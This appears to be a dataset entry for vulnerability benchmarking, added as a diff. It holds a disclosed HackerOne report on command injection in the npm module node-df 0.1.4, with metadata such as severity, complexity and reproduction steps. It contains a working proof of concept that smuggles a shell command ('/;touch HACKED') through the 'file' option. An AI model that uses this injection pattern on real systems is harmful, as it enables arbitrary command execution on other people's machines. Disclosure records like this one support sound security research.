@@ -1,0 +1,53 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "mik317 ",
+  "title": "[node-df] RCE via insecure command concatenation",
+  "content": "\nI would like to report a RCE issue in the node-df module.\nIt allows to execute arbitrary commands remotely inside the victim's PC\nModule\nmodule name: node-df\nversion: 0.1.4\nnpm page: https://www.npmjs.com/package/node-df\nModule Description\nnode-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.\nModule Stats\n[N/A] downloads in the last day\n[3,023] downloads in the last week\n[N/A] downloads in the last month\nVulnerability Description\nThe issue occurs because a user input is concatenated inside a command that will be executed without any check. The issue arises here:\nSteps To Reproduce:\nCreate the following PoC file:\nCode 320 Bytes\n1// poc.js\n2var df = require('node-df');\n3var options = {\n4        file: '/;touch HACKED',\n5        prefixMultiplier: 'GB',\n6        isDisplayPrefixMultiplier: true,\n7        precision: 2\n8    };\n9 \n10df(options, function (error, response) {\n11    if (error) { throw error; }\n12 \n13    console.log(JSON.stringify(response, null, 2));\n14});\nExecute the following commands in terminal:\nCode 151 Bytes\n1npm i node-df # Install affected module\n2ls # Make sure there isn't any *HACKED* file\n3node poc.js #  Run the PoC\n4ls # The *HACKED* file has been created\nPatch\nDon't concatenate commands using insecure user's inputs :)\nSupporting Material/References:\n[OPERATING SYSTEM VERSION]: Kali Linux\n\n\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nRCE on node-df via insecure command concatenation\n\n",
+  "severity": [
+    8.4,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1575505980,
+  "report_url": "https://hackerone.com/reports/703412",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the vulnerable module: npm i node-df"
+    ],
+    [
+      2,
+      "Create a PoC file (poc.js) with the malicious options object containing a command injection payload"
+    ],
+    [
+      3,
+      "Run the PoC: node poc.js"
+    ],
+    [
+      4,
+      "Verify the arbitrary command execution by checking for the created file (HACKED)"
+    ]
+  ],
+  "vuln_description": "The node-df module is vulnerable to Remote Code Execution (RCE) via insecure command concatenation. User-supplied input in the 'file' parameter is directly concatenated into a system command without proper sanitization, allowing attackers to execute arbitrary commands on the host system.",
+  "reason": "This vulnerability is straightforward to discover as it follows a common pattern of command injection vulnerabilities where user input is directly concatenated into system commands. The attack vector is obvious once the command construction pattern is identified in the source code, and no complex application state manipulation is required.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection through user-controlled input in a Node.js module, which is not related to authentication or authorization boundaries within an application. The proposed methodologies focus on AuthN/AuthZ and IDOR vulnerabilities within web applications by testing session and resource access controls, not command injection in system-level operations.",
+    "is_detectable": false
+  }
+}
